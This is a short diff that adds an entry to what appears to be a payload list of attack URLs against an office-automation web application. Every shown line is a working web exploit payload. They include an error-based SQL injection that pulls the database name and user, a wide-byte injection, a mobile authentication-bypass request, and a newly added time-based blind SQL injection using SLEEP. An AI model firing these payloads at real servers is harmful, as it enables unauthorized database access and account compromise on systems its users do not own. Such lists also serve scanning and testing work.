@@ -4,3 +4,4 @@
 /interface/ugo.php?OA_USER=a%2527%20and%201=(select%201%20from(select%20count(*),concat((select%20database()),0x7c,user(),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20%25271%2527=%25271
 /inc/finger/use_finger.php?USER_ID=-123%df
 /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0
+/general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1) and IF(1=1, SLEEP(5), 0) and (1)=(1)
